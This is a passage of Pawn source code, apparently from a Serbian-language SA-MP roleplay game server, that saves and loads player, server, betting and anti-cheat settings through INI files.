        INI_WriteInt(File, "Achivements1", PlayerInfo[playerid][xAchivements][0]);
        INI_WriteInt(File, "Achivements2", PlayerInfo[playerid][xAchivements][1]);
        INI_WriteInt(File, "Achivements3", PlayerInfo[playerid][xAchivements][2]);
        INI_WriteInt(File, "Achivements4", PlayerInfo[playerid][xAchivements][3]);
        INI_WriteInt(File, "Achivements5", PlayerInfo[playerid][xAchivements][4]);
        INI_WriteInt(File, "Achivements6", PlayerInfo[playerid][xAchivements][5]);
        INI_WriteInt(File, "Achivements7", PlayerInfo[playerid][xAchivements][6]);
        INI_WriteInt(File, "Achivements8", PlayerInfo[playerid][xAchivements][7]);
        INI_WriteInt(File, "Achivements9", PlayerInfo[playerid][xAchivements][8]);
        INI_WriteInt(File, "Achivements10", PlayerInfo[playerid][xAchivements][9]);
        INI_WriteInt(File, "Achivements11", PlayerInfo[playerid][xAchivements][10]);
        INI_WriteInt(File, "Achivements12", PlayerInfo[playerid][xAchivements][11]);
        INI_WriteInt(File, "Achivements13", PlayerInfo[playerid][xAchivements][12]);
        INI_WriteInt(File, "Achivements14", PlayerInfo[playerid][xAchivements][13]);
        INI_WriteInt(File, "Achivements15", PlayerInfo[playerid][xAchivements][14]);
        INI_WriteInt(File, "Achivements16", PlayerInfo[playerid][xAchivements][15]);
        INI_WriteInt(File, "Achivements17", PlayerInfo[playerid][xAchivements][16]);

        INI_WriteInt(File, "RepairKit", PlayerInfo[playerid][xRepairKit]);
        INI_WriteInt(File, "OrgPoen", PlayerInfo[playerid][xOrgPoen]);
        INI_WriteInt(File, "SkillWorkAholic", PlayerInfo[playerid][xSkillWorkAholic]);
        INI_WriteInt(File, "SkillSpeech", PlayerInfo[playerid][xSkillSpeech]);
        INI_WriteInt(File, "SkillStamina", PlayerInfo[playerid][xSkillStamina]);
        INI_WriteInt(File, "SkillDrive", PlayerInfo[playerid][xSkillDrive]);
        INI_WriteInt(File, "SkillPoen", PlayerInfo[playerid][xSkillPoen]);
        INI_WriteInt(File, "Disarm", PlayerInfo[playerid][xDisarm]);
        INI_WriteInt(File, "Youtuber", PlayerInfo[playerid][xYoutuber]);
        INI_WriteInt(File, "AdminWarn", PlayerInfo[playerid][xAdminWarn]);
        INI_WriteInt(File, "NaftaID", PlayerInfo[playerid][xNaftaID]);
        INI_WriteInt(File, "Kantica", PlayerInfo[playerid][xKantica]);

        INI_WriteInt(File, "Inventory0", PlayerInfo[playerid][xInventory][0]);
        INI_WriteInt(File, "Inventory00", PlayerInfo[playerid][xInventoryAmmo][0]);
        INI_WriteInt(File, "Inventory1", PlayerInfo[playerid][xInventory][1]);
        INI_WriteInt(File, "Inventory11", PlayerInfo[playerid][xInventoryAmmo][1]);
        INI_WriteInt(File, "Inventory2", PlayerInfo[playerid][xInventory][2]);
        INI_WriteInt(File, "Inventory22", PlayerInfo[playerid][xInventoryAmmo][2]);
        INI_WriteInt(File, "Inventory3", PlayerInfo[playerid][xInventory][3]);
        INI_WriteInt(File, "Inventory33", PlayerInfo[playerid][xInventoryAmmo][3]);
        INI_WriteInt(File, "Inventory4", PlayerInfo[playerid][xInventory][4]);
        INI_WriteInt(File, "Inventory44", PlayerInfo[playerid][xInventoryAmmo][4]);
        INI_WriteInt(File, "Inventory5", PlayerInfo[playerid][xInventory][5]);
        INI_WriteInt(File, "Inventory55", PlayerInfo[playerid][xInventoryAmmo][5]);
        INI_WriteInt(File, "Inventory6", PlayerInfo[playerid][xInventory][6]);
        INI_WriteInt(File, "Inventory66", PlayerInfo[playerid][xInventoryAmmo][6]);
        INI_WriteInt(File, "Inventory7", PlayerInfo[playerid][xInventory][7]);
        INI_WriteInt(File, "Inventory77", PlayerInfo[playerid][xInventoryAmmo][7]);

		INI_Close( File );
		return true;
}

//------------------------------------------------------------------------------

forward LoadStareParove( name[ ], value[ ] );
public LoadStareParove( name[ ], value[ ] ) {

	new string[ 30 ];

	for( new i = 0; i < 10; i++) {

	    format( string, sizeof( string ), "par1ID%d", i );
		INI_Int( string, StariParovi[ i ][ parID ][ 0 ] );
		
		format( string, sizeof( string ), "par2ID%d", i );
		INI_Int( string, StariParovi[ i ][ parID ][ 1 ] );

		format( string, sizeof( string ), "Rezultat1%d", i );
		INI_Int( string, StariParovi[ i ][ Rezultat ][ 0 ] );
		
		format( string, sizeof( string ), "Rezultat2%d", i );
		INI_Int( string, StariParovi[ i ][ Rezultat ][ 1 ] );

		format( string, sizeof( string ), "Kvota%d", i );
		INI_Float( string, StariParovi[ i ][ Kvota ] );
		
		format( string, sizeof( string ), "HourPobeda%d", i );
		INI_String( string, StariParovi[ i ][ HourPobeda ], 24 );

	}

    return 1;
}

forward SaveStareParove( );
public SaveStareParove( ) {

    new string[ 30 ];

    new INI:File = INI_Open( "Ostalo/StariParovi.ini" );
    
    INI_SetTag( File, "Informacije" );
    
    for( new i = 0; i < 10; i++) {

	    format( string, sizeof( string ), "par1ID%d", i );
		INI_WriteInt( File, string, StariParovi[ i ][ parID ][ 0 ] );

		format( string, sizeof( string ), "par2ID%d", i );
		INI_WriteInt( File, string, StariParovi[ i ][ parID ][ 1 ] );

		format( string, sizeof( string ), "Rezultat1%d", i );
		INI_WriteInt( File, string, StariParovi[ i ][ Rezultat ][ 0 ] );

		format( string, sizeof( string ), "Rezultat2%d", i );
		INI_WriteInt( File, string, StariParovi[ i ][ Rezultat ][ 1 ] );

		format( string, sizeof( string ), "Kvota%d", i );
		INI_WriteFloat( File, string, StariParovi[ i ][ Kvota ] );

		format( string, sizeof( string ), "HourPobeda%d", i );
		INI_WriteString( File, string, StariParovi[ i ][ HourPobeda ] );

	}
    
    INI_Close( File );
	return true;
}



forward LoadServerStats( name[ ], value[ ] );
public LoadServerStats( name[ ], value[ ] ) {
    INI_Int( "RegistrovanihKorisnika", ServerInfo[ RegistrovanihKorisnika ] );
    INI_Int( "BanovanihKorisnika", ServerInfo[ BanovanihKorisnika ] );
    INI_Int( "KikovanihKorisnika", ServerInfo[ KikovanihKorisnika ] );
    INI_Int( "BrojWarnova", ServerInfo[ BrojWarnova ] );
    INI_Int( "BrojPosetaServeru", ServerInfo[ BrojPosetaServeru ] );
    INI_Bool( "HappyHours", ServerInfo[ HappyHours ] );
    INI_Int( "PocetniLevel", ServerInfo[ PocetniLevel ] );
    INI_Int( "PocetniNovaca", ServerInfo[ PocetniNovaca ] );
    INI_Bool( "KupovinaVozila", ServerInfo[ KupovinaVozila ] );
    INI_Bool( "Report", ServerInfo[ Report ] );
    INI_Bool( "Pitanja", ServerInfo[ Pitanja ] ); 
    INI_Int( "RekordServera", ServerInfo[ RekordServera ] );
    INI_Bool( "Oglasi", ServerInfo[ Oglasi ] );
    INI_Bool( "Registracija", ServerInfo[ Registracija ] );
    INI_Int( "Gorivo", ServerInfo[ Gorivo ] );
	INI_Int( "Drva", ServerInfo[ Drva ] );
	INI_Int( "ReactTime", ServerInfo[ ReactTime ] );
	INI_String( "ReactName", ServerInfo[ ReactName ], MAX_PLAYER_NAME );
	INI_Int( "Zlato", ServerInfo[ Zlato ] );
    INI_Int("HappyJob", ServerInfo[HappyJob]);
    INI_Int("SrecniID", ServerInfo[SrecniID]);
    INI_Int("cenaDeonicaMAX", ServerInfo[cenaDeonicaMAX]);
    INI_Int("cenaDeonicaMIN", ServerInfo[cenaDeonicaMIN]);
    return 1;
}

forward SaveServerStats( );
public SaveServerStats( ) {

    new INI:File = INI_Open( "Ostalo/serverstats.ini" );
    INI_SetTag( File, "Informacije" );
    INI_WriteInt( File, "RegistrovanihKorisnika", ServerInfo[ RegistrovanihKorisnika ] );
    INI_WriteInt( File, "BanovanihKorisnika", ServerInfo[ BanovanihKorisnika ] );
    INI_WriteInt( File, "KikovanihKorisnika", ServerInfo[ KikovanihKorisnika ] );
    INI_WriteInt( File, "BrojWarnova", ServerInfo[ BrojWarnova ] );
    INI_WriteInt( File, "BrojPosetaServeru", ServerInfo[ BrojPosetaServeru ] );
    INI_WriteBool( File, "HappyHours", ServerInfo[ HappyHours ] );
    INI_WriteInt( File, "PocetniLevel", ServerInfo[ PocetniLevel ] );
    INI_WriteInt( File, "PocetniNovaca", ServerInfo[ PocetniNovaca ] );
    INI_WriteBool( File, "KupovinaVozila", ServerInfo[ KupovinaVozila ] );
    INI_WriteBool( File, "Report", ServerInfo[ Report ] );
    INI_WriteBool( File, "Pitanja", ServerInfo[ Pitanja ] );
    INI_WriteInt( File, "RekordServera", ServerInfo[ RekordServera ] );
    INI_WriteBool( File, "Oglasi", ServerInfo[ Oglasi ] );
    INI_WriteBool( File, "Registracija", ServerInfo[ Registracija ] );
    INI_WriteInt( File, "Gorivo", ServerInfo[ Gorivo ] );
	INI_WriteInt( File, "Drva", ServerInfo[ Drva ] );
	INI_WriteInt( File, "ReactTime", ServerInfo[ ReactTime ] );
	INI_WriteString( File, "ReactName", ServerInfo[ ReactName ] );
	INI_WriteInt( File, "Zlato", ServerInfo[ Zlato ] );
    INI_WriteInt(File, "HappyJob", ServerInfo[HappyJob]);
    INI_WriteInt(File, "SrecniID", ServerInfo[SrecniID]);
    INI_WriteInt(File, "cenaDeonicaMAX", ServerInfo[cenaDeonicaMAX]);
    INI_WriteInt(File, "cenaDeonicaMIN", ServerInfo[cenaDeonicaMIN]);
    INI_Close( File );
	return true;
}

//------------------------------------------------------------------------------
public LoadAntiCheat( name[ ], value[ ] ) {
    INI_Int( "WeaponHRezimRada", antiCheatSS[ WeaponHRezimRada ] );
    INI_Int( "TeleportHRezimRada", antiCheatSS[ TeleportHRezimRada ] );
    INI_Int( "HealthHRezimRada", antiCheatSS[ HealthHRezimRada ] );
    INI_Int( "SpeedHRezimRada", antiCheatSS[ SpeedHRezimRada ] );
    INI_Int( "JetPackHRezimRada", antiCheatSS[ JetPackHRezimRada ] );
    INI_Int( "MoneyHRezimRada", antiCheatSS[ MoneyHRezimRada ] );
    INI_Int( "FlyHRezimRada", antiCheatSS[ FlyHRezimRada ] );
    INI_Int( "TuningHRezimRada", antiCheatSS[ TuningHRezimRada ] );
    INI_Int( "VehRepRezimRada", antiCheatSS[ VehRepRezimRada ] );
    INI_Bool( "antiWeaponH", antiCheatSS[ antiWeaponH ] );
    INI_Bool( "antiTeleportH", antiCheatSS[ antiTeleportH ] );
    INI_Bool( "antiHealthH", antiCheatSS[ antiHealthH ] );
    INI_Bool( "antiArmourH", antiCheatSS[ antiArmourH ] );
    INI_Bool( "antiSpeedH", antiCheatSS[ antiSpeedH ] );
    INI_Bool( "antiJetPackH", antiCheatSS[ antiJetPackH ] );
    INI_Bool( "antiMoneyH", antiCheatSS[ antiMoneyH ] );
    INI_Bool( "antiFlyH", antiCheatSS[ antiFlyH ] );
    INI_Bool( "antiTuningH", antiCheatSS[ antiTuningH ] );
    INI_Bool( "antiVehRepair", antiCheatSS[ antiVehRepair ] );
	return 1;
}
public SaveAntiCheat( ) {
    new INI:File = INI_Open( "Ostalo/anticheat.ini" );
    INI_SetTag( File, "Informacije" );
    INI_WriteInt( File, "WeaponHRezimRada", antiCheatSS[ WeaponHRezimRada ] );
    INI_WriteInt( File, "TeleportHRezimRada", antiCheatSS[ TeleportHRezimRada ] );
    INI_WriteInt( File, "HealthHRezimRada", antiCheatSS[ HealthHRezimRada ] );
    INI_WriteInt( File, "SpeedHRezimRada", antiCheatSS[ SpeedHRezimRada ] );
    INI_WriteInt( File, "JetPackHRezimRada", antiCheatSS[ JetPackHRezimRada ] );
    INI_WriteInt( File, "MoneyHRezimRada", antiCheatSS[ MoneyHRezimRada ] );
    INI_WriteInt( File, "FlyHRezimRada", antiCheatSS[ FlyHRezimRada ] );
    INI_WriteInt( File, "TuningHRezimRada", antiCheatSS[ TuningHRezimRada ] );
    INI_WriteInt( File, "VehRepRezimRada", antiCheatSS[ VehRepRezimRada ] );
    INI_WriteBool( File, "antiWeaponH", antiCheatSS[ antiWeaponH ] );
    INI_WriteBool( File, "antiTeleportH", antiCheatSS[ antiTeleportH ] );
    INI_WriteBool( File, "antiHealthH", antiCheatSS[ antiHealthH ] );
    INI_WriteBool( File, "antiArmourH", antiCheatSS[ antiArmourH ] );
    INI_WriteBool( File, "antiSpeedH", antiCheatSS[ antiSpeedH ] );
    INI_WriteBool( File, "antiJetPackH", antiCheatSS[ antiJetPackH ] );
    INI_WriteBool( File, "antiMoneyH", antiCheatSS[ antiMoneyH ] );
    INI_WriteBool( File, "antiFlyH", antiCheatSS[ antiFlyH ] );
    INI_WriteBool( File, "antiTuningH", antiCheatSS[ antiTuningH ] );
    INI_WriteBool( File, "antiVehRepair", antiCheatSS[ antiVehRepair ] );
	INI_Close( File );
	return true;
}
//------------------------------------------------------------------------------
forward ShowOffStats( name[ ], value[ ] );
public ShowOffStats( name[ ], value[ ] ) {
	INI_Int( "Godine", OfflineCheck[ Godine ] );
	INI_Int( "Pol", OfflineCheck[ Pol ] );
	INI_Int( "Novac", OfflineCheck[ Novac ] );
	INI_Int( "Level", OfflineCheck[ Level ] );
	INI_Int( "Respekt", OfflineCheck[ Respekt ] );
	INI_Int( "Clan", OfflineCheck[ Organizacija ] );
	INI_Int( "Rank", OfflineCheck[ Rank ] );
	INI_Int( "VoziloID1", OfflineCheck[ Vozilo1 ] );
	INI_Int( "VoziloID2", OfflineCheck[ Vozilo2 ] );
	INI_Int( "VoziloID3", OfflineCheck[ Vozilo3 ] );
	INI_Int( "VoziloID4", OfflineCheck[ Vozilo4 ] );
	INI_Int( "Posao", OfflineCheck[ Posao ] );
	INI_Int( "Ugovor", OfflineCheck[ Posaougovor ] );
	INI_Int( "OnlineSati", OfflineCheck[ OnlineSati ] );
   	INI_Int( "BRacun", OfflineCheck[ Banka ] );
   	INI_Int( "Property1", OfflineCheck[ Imovina1 ] );
   	INI_Int( "Property2", OfflineCheck[ Imovina2 ] );
   	INI_Int( "Property3", OfflineCheck[ Imovina3 ] );
   	INI_Int( "Warn", OfflineCheck[ Upozorenja ] );
   	INI_Int( "FirmaID", OfflineCheck[ Firma ] );
   	INI_Int( "StaffMin", OfflineCheck[ StaffMin ] );
   	INI_String( "LastLogin", OfflineCheck[ LastLogin ], 64 );
   	INI_Int( "RPTeacher", OfflineCheck[ GameSage ] );
   	INI_Int( "Admin", OfflineCheck[ Admin ] );
   	INI_Int( "HotelID", OfflineCheck[ Hotel ] );
   	INI_String( "Email", OfflineCheck[ eMail ], 34 );
	return 1;
}

public OcitajKorisnika( playerid, name[ ], value[ ] ) {

    INI_String( "Lozinka", PlayerInfo[ playerid ][ xLozinka ], LOZINKA_STRING );
	INI_Int( "Pol", PlayerInfo[ playerid ][ xPol ] );
	INI_Int( "Godine", PlayerInfo[ playerid ][ xGodine ] );
    INI_Int( "Novac", PlayerInfo[ playerid ][ xNovac ] );
	INI_Int( "Level", PlayerInfo[ playerid ][ xLevel ] );
	INI_Int( "Respekt", PlayerInfo[ playerid ][ xRespekt ] );
	INI_Int( "Poboljsanja", PlayerInfo[ playerid ][ xPoboljsanja ] );
	INI_Int( "PayDay", PlayerInfo[ playerid ][ xPayDay ] );
	INI_Int( "Admin", PlayerInfo[ playerid ][ xAdmin ] );
	INI_Int( "Skin", PlayerInfo[ playerid ][ xSkin ] );
	INI_Int( "Spawn", PlayerInfo[ playerid ][ xSpawn ] );
	INI_Int( "Lider", PlayerInfo[ playerid ][ xLider ] );
	INI_Int( "Clan", PlayerInfo[ playerid ][ xClan ] );
	INI_Int( "Rank", PlayerInfo[ playerid ][ xRank ] );
	INI_Int( "VoziloID1", PlayerInfo[ playerid ][ xVoziloID ][ 0 ] );
	INI_Int( "VoziloID2", PlayerInfo[ playerid ][ xVoziloID ][ 1 ] );
	INI_Int( "VoziloID3", PlayerInfo[ playerid ][ xVoziloID ][ 2 ] );
	INI_Int( "VoziloID4", PlayerInfo[ playerid ][ xVoziloID ][ 3 ] );
	INI_Int( "Materijali", PlayerInfo[ playerid ][ xMaterijali ] );
	INI_Int( "FirmaID", PlayerInfo[ playerid ][ xFirmaID ] );
	INI_Int( "Posao", PlayerInfo[ playerid ][ xPosao ] );
	INI_Int( "Ugovor", PlayerInfo[ playerid ][ xUgovor ] );
	INI_Int( "MehSkill", PlayerInfo[ playerid ][ xMehSkill ] );
	INI_Int( "MDelovi", PlayerInfo[ playerid ][ xMDelovi ] );
	INI_Int( "Head", PlayerInfo[ playerid ][ xHead ] );
	INI_Float( "HeadPos1", PlayerInfo[ playerid ][ xHeadPos ][ 0 ] );
	INI_Float( "HeadPos2", PlayerInfo[ playerid ][ xHeadPos ][ 1 ] );
	INI_Float( "HeadPos3", PlayerInfo[ playerid ][ xHeadPos ][ 2 ] );
	INI_Float( "HeadPos4", PlayerInfo[ playerid ][ xHeadPos ][ 3 ] );
	INI_Float( "HeadPos5", PlayerInfo[ playerid ][ xHeadPos ][ 4 ] );
	INI_Float( "HeadPos6", PlayerInfo[ playerid ][ xHeadPos ][ 5 ] );
	INI_Float( "HeadPos7", PlayerInfo[ playerid ][ xHeadPos ][ 6 ] );
	INI_Float( "HeadPos8", PlayerInfo[ playerid ][ xHeadPos ][ 7 ] );
	INI_Float( "HeadPos9", PlayerInfo[ playerid ][ xHeadPos ][ 8 ] );
	INI_Int( "Face", PlayerInfo[ playerid ][ xFace ] );
	INI_Float( "FacePos1", PlayerInfo[ playerid ][ xFacePos ][ 0 ] );
	INI_Float( "FacePos2", PlayerInfo[ playerid ][ xFacePos ][ 1 ] );
	INI_Float( "FacePos3", PlayerInfo[ playerid ][ xFacePos ][ 2 ] );
	INI_Float( "FacePos4", PlayerInfo[ playerid ][ xFacePos ][ 3 ] );
	INI_Float( "FacePos5", PlayerInfo[ playerid ][ xFacePos ][ 4 ] );
	INI_Float( "FacePos6", PlayerInfo[ playerid ][ xFacePos ][ 5 ] );
	INI_Float( "FacePos7", PlayerInfo[ playerid ][ xFacePos ][ 6 ] );
	INI_Float( "FacePos8", PlayerInfo[ playerid ][ xFacePos ][ 7 ] );
	INI_Float( "FacePos9", PlayerInfo[ playerid ][ xFacePos ][ 8 ] );
	INI_Int( "SungMask", PlayerInfo[ playerid ][ xSungMask ] );
	INI_Float( "SungMaskPos1", PlayerInfo[ playerid ][ xSungMaskPos ][ 0 ] );
	INI_Float( "SungMaskPos2", PlayerInfo[ playerid ][ xSungMaskPos ][ 1 ] );
	INI_Float( "SungMaskPos3", PlayerInfo[ playerid ][ xSungMaskPos ][ 2 ] );
	INI_Float( "SungMaskPos4", PlayerInfo[ playerid ][ xSungMaskPos ][ 3 ] );
	INI_Float( "SungMaskPos5", PlayerInfo[ playerid ][ xSungMaskPos ][ 4 ] );
	INI_Float( "SungMaskPos6", PlayerInfo[ playerid ][ xSungMaskPos ][ 5 ] );
	INI_Float( "SungMaskPos7", PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ] );
	INI_Float( "SungMaskPos8", PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ] );
	INI_Float( "SungMaskPos9", PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ] );
	INI_Int( "Cigare", PlayerInfo[ playerid ][ xCigare ] );
	INI_Int( "Upaljac", PlayerInfo[ playerid ][ xUpaljac ] );
	INI_Int( "BStil", PlayerInfo[ playerid ][ xBStil ] );
	INI_Int( "Registrovan", PlayerInfo[ playerid ][ xRegistrovan ] );
	INI_Float( "SHealth", PlayerInfo[ playerid ][ xSHealth ] );
	INI_Int( "BrojTelefona", PlayerInfo[ playerid ][ xBrojTelefona ] );
	INI_Int( "Vozacka", PlayerInfo[ playerid ][ xVozacka ] );
	INI_Int( "Motorska", PlayerInfo[ playerid ][ xMotorska ] );
	INI_Int( "KamionskaC1", PlayerInfo[ playerid ][ xKamionskaC1 ] );
	INI_Int( "KamionskaC2", PlayerInfo[ playerid ][ xKamionskaC2 ] );
	INI_Int( "KamionskaC3", PlayerInfo[ playerid ][ xKamionskaC3 ] );
	INI_Int( "Brodska", PlayerInfo[ playerid ][ xBrodska ] );
	INI_Int( "Letelica", PlayerInfo[ playerid ][ xLetelica ] );
	INI_Int( "Osnovna", PlayerInfo[ playerid ][ xOsnovna ] );
	INI_Int( "Srednja", PlayerInfo[ playerid ][ xSrednja ] );
	INI_Int( "Fakultet", PlayerInfo[ playerid ][ xFakultet ] );
	INI_Int( "SkolaLimit", PlayerInfo[ playerid ][ xSkolaLimit ] );
	INI_Int( "Ubijen", PlayerInfo[ playerid ][ xUbijen ] );
	INI_Int( "Drug1", PlayerInfo[ playerid ][ xDrug ][ 0 ] );
	INI_Int( "Drug2", PlayerInfo[ playerid ][ xDrug ][ 1 ] );
	INI_Int( "Drug3", PlayerInfo[ playerid ][ xDrug ][ 2 ] );
	INI_Int( "Drug4", PlayerInfo[ playerid ][ xDrug ][ 3 ] );
	INI_Int( "Drug5", PlayerInfo[ playerid ][ xDrug ][ 4 ] );
	INI_Int( "DrugCode1", PlayerInfo[ playerid ][ xDrugCode ][ 0 ] );
	INI_Int( "DrugCode2", PlayerInfo[ playerid ][ xDrugCode ][ 1 ] );
	INI_Int( "DrugCode3", PlayerInfo[ playerid ][ xDrugCode ][ 2 ] );
	INI_Int( "DrugCode4", PlayerInfo[ playerid ][ xDrugCode ][ 3 ] );
	INI_Int( "DrugCode5", PlayerInfo[ playerid ][ xDrugCode ][ 4 ] );
	INI_Int( "Solna", PlayerInfo[ playerid ][ xSolna ] );
	INI_Int( "Pseudo", PlayerInfo[ playerid ][ xPseudo ] );
	INI_Int( "SodaB", PlayerInfo[ playerid ][ xSodaB ] );
	INI_Int( "CrveniF", PlayerInfo[ playerid ][ xCrveniF ] );
	INI_Int( "LysAcid", PlayerInfo[ playerid ][ xLysAcid ] );
	INI_Int( "DesVoda", PlayerInfo[ playerid ][ xDesVoda ] );
	INI_Int( "Marihuana", PlayerInfo[ playerid ][ xMarihuana ] );
	INI_Int( "Opium", PlayerInfo[ playerid ][ xOpium ] );
	INI_Int( "Kalcijum", PlayerInfo[ playerid ][ xKalcij ] );
	INI_Int( "AmonijumHlorid", PlayerInfo[ playerid ][ xAmonijH ] );
	INI_Int( "Kokain", PlayerInfo[ playerid ][ xKokain ] );
	INI_Int( "Kokain2", PlayerInfo[ playerid ][ xKokain2 ] );
	INI_Int( "MetilAmin", PlayerInfo[ playerid ][ xMetilAmin ] );
	INI_Int( "Hunger", PlayerInfo[ playerid ][ xHunger ] );
	INI_Bool( "HeroinAddict", PlayerInfo[ playerid ][ xHeroinAddict ] );
	INI_Int( "HeroinUsed", PlayerInfo[ playerid ][ xHeroinUsed ] );
	INI_Int( "HeroinIndicator", PlayerInfo[ playerid ][ xHeroinIndicator ] );
	INI_Bool( "CokeCrackAddict", PlayerInfo[ playerid ][ xCokeCrackAddict ] );
	INI_Int( "CokeCrackUsed", PlayerInfo[ playerid ][ xCokeCrackUsed ] );
	INI_Int( "CokeCrackIndicator", PlayerInfo[ playerid ][ xCokeCrackIndicator ] );
	INI_Bool( "MethAddict", PlayerInfo[ playerid ][ xMethAddict ] );
	INI_Int( "MethIndicator", PlayerInfo[ playerid ][ xMethIndicator ] );
   	INI_Int( "MethUsed", PlayerInfo[ playerid ][ xMethUsed ] );
   	INI_Bool( "Inekcija", PlayerInfo[ playerid ][ xInekcija ] );
   	INI_Bool( "Toolkit", PlayerInfo[ playerid ][ xToolkit ] );
   	INI_Int( "Property1", PlayerInfo[ playerid ][ xProperty ][ 0 ] );
   	INI_Int( "Property2", PlayerInfo[ playerid ][ xProperty ][ 1 ] );
   	INI_Int( "Property3", PlayerInfo[ playerid ][ xProperty ][ 2 ] );
   	INI_Bool( "GunLicense", PlayerInfo[ playerid ][ xGunLicense ] );
   	INI_Int( "TelefonBon", PlayerInfo[ playerid ][ xTelefonBon ] );
   	INI_Int( "ModelTelefona", PlayerInfo[ playerid ][ xModelTelefona ] );
   	INI_Int( "Snaga", PlayerInfo[ playerid ][ xSnaga ] );
   	INI_Int( "Zatvor", PlayerInfo[ playerid ][ xZatvor ] );
   	INI_Int( "ZatvorVreme", PlayerInfo[ playerid ][ xZatvorVreme ] );
   	INI_Int( "Wanted", PlayerInfo[ playerid ][ xWanted ] );
   	INI_Int( "Uhapsen", PlayerInfo[ playerid ][ xUhapsen ] );
   	INI_Int( "PDUhapsio", PlayerInfo[ playerid ][ xPDUhapsio ] );
   	INI_Int( "PDStatsTicket", PlayerInfo[ playerid ][ xPDStatsTicket ] );
	INI_Int( "PDStatsTicketMoney", PlayerInfo[ playerid ][ xPDStatsTicketMoney ] );
	INI_Int( "TakenWeps", PlayerInfo[ playerid ][ xTakenWeps ] );
   	INI_Int( "TakenDrugs", PlayerInfo[ playerid ][ xTakenDrugs ] );
   	INI_Int( "PocetniTut", PlayerInfo[ playerid ][ xPocetniTut ] );
   	INI_Int( "AKod", PlayerInfo[ playerid ][ xAKod ] );
   	INI_Int( "Sat", PlayerInfo[ playerid ][ xSat ] );
   	INI_Int( "MaskID", PlayerInfo[ playerid ][ xMaskID ] );
   	INI_Int( "BRacun", PlayerInfo[ playerid ][ xBRacun ] );
   	INI_Int( "PreostaloZaOtplatu", PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
   	INI_Int( "IznosRate", PlayerInfo[ playerid ][ xIznosRate ] );
   	INI_Int( "IznosKredita", PlayerInfo[ playerid ][ xIznosKredita ] );
   	INI_Int( "OnlineSati", PlayerInfo[ playerid ][ xOnlineSati ] );
   	INI_Int( "RPTeacher", PlayerInfo[ playerid ][ xSupporter ] );
   	INI_Int( "RPLearn", PlayerInfo[ playerid ][ xRPLearn ] );
   	INI_Int( "Warn", PlayerInfo[ playerid ][ xWarn ] );
   	INI_Int( "Mute", PlayerInfo[ playerid ][ xMute ] );
   	INI_Float( "Marker1", PlayerInfo[ playerid ][ xMarker ][ 0 ] );
   	INI_Float( "Marker2", PlayerInfo[ playerid ][ xMarker ][ 1 ] );
   	INI_Float( "Marker3", PlayerInfo[ playerid ][ xMarker ][ 2 ] );
   	INI_Int( "BrojNews", PlayerInfo[ playerid ][ xBrojNews ] );
   	INI_Int( "OrgUgovor", PlayerInfo[ playerid ][ xOrgUgovor ] );
	INI_Int( "Helmet", PlayerInfo[ playerid ][ xHelmet ] );
	INI_Int( "BanDays", PlayerInfo[ playerid ][ xBDays ] );
	INI_Int( "BanMonths", PlayerInfo[ playerid ][ xBMonths ] );
	INI_Int( "BanYear", PlayerInfo[ playerid ][ xBYears ] );
	INI_Int( "GradRank", PlayerInfo[ playerid ][ xGradRank ] );
	INI_Int( "SkriptaRank", PlayerInfo[ playerid ][ xSkriptaRank ] );
	INI_Int( "UlazBL", PlayerInfo[ playerid ][ xUlazBL ] );
	INI_Bool( "Boombox", PlayerInfo[ playerid ][ xBoombox ] );
	INI_Float( "HelmetPos1", PlayerInfo[ playerid ][ xHelmetPos ][ 0 ] );
	INI_Float( "HelmetPos2", PlayerInfo[ playerid ][ xHelmetPos ][ 1 ] );
	INI_Float( "HelmetPos3", PlayerInfo[ playerid ][ xHelmetPos ][ 2 ] );
	INI_Float( "HelmetPos4", PlayerInfo[ playerid ][ xHelmetPos ][ 3 ] );
	INI_Float( "HelmetPos5", PlayerInfo[ playerid ][ xHelmetPos ][ 4 ] );
	INI_Float( "HelmetPos6", PlayerInfo[ playerid ][ xHelmetPos ][ 5 ] );
	INI_Float( "HelmetPos7", PlayerInfo[ playerid ][ xHelmetPos ][ 6 ] );
	INI_Float( "HelmetPos8", PlayerInfo[ playerid ][ xHelmetPos ][ 7 ] );
	INI_Float( "HelmetPos9", PlayerInfo[ playerid ][ xHelmetPos ][ 8 ] );
	INI_Int( "Drzava", PlayerInfo[ playerid ][ xDrzava ] );
	INI_String( "Email", PlayerInfo[ playerid ][ xEmail ], 34 );
	INI_Int( "VIPLevel", PlayerInfo[ playerid ][ xVIPLevel ] );
    INI_Int("VIPVreme", PlayerInfo[playerid][xVIPVreme]);
	INI_Int( "HitmenCena", PlayerInfo[ playerid ][ xHitmenCena ] );
	INI_Int( "Objekt1", PlayerInfo[ playerid ][ xObject ][ 0 ] );
    INI_Int( "Objekt2", PlayerInfo[ playerid ][ xObject ][ 1 ] );
	INI_Int( "Objekt3", PlayerInfo[ playerid ][ xObject ][ 2 ] );
    INI_Int( "Objekt4", PlayerInfo[ playerid ][ xObject ][ 3 ] );
	INI_Int( "Objekt5", PlayerInfo[ playerid ][ xObject ][ 4 ] );
    INI_Int( "Objekt6", PlayerInfo[ playerid ][ xObject ][ 5 ] );
    INI_Int( "Objekt7", PlayerInfo[ playerid ][ xObject ][ 6 ] );
    INI_Int( "Objekt8", PlayerInfo[ playerid ][ xObject ][ 7 ] );
 	INI_Int( "Objekt9", PlayerInfo[ playerid ][ xObject ][ 8 ] );
    INI_Int( "Objekt10", PlayerInfo[ playerid ][ xObject ][ 9 ] );
    INI_Int( "LesLimit", PlayerInfo[ playerid ][ xLesLimit ] );
    INI_Int( "KazneniUgovor", PlayerInfo[ playerid ][ xKazneniUgovor ] );
    INI_String( "OffPJail", PlayerInfo[ playerid ][ xOffPJail ], 64 );
    INI_String( "OffPPrison", PlayerInfo[ playerid ][ xOffPPrison ], 64 );
    INI_String( "OffPMute", PlayerInfo[ playerid ][ xOffPMute ], 64 );
    INI_Int( "StaffMin", PlayerInfo[ playerid ][ xStaffMin ] );
    INI_String( "LastLogin", PlayerInfo[ playerid ][ xLastLogin ], 64 );
    INI_Bool( "Married", PlayerInfo[ playerid ][ xMarried ] );
	INI_String( "MarriedTo", PlayerInfo[ playerid ][ xMarriedTo ], 24 );
	INI_Bool( "TogMob", PlayerInfo[ playerid ][ xTogMob ] );
	INI_Int( "HotelID", PlayerInfo[ playerid ][ xHotelID ] );
	INI_Int( "HotelRoom", PlayerInfo[ playerid ][ xHotelRoom ] );
	INI_Int( "Promoter", PlayerInfo[ playerid ][ xPromoter ] );
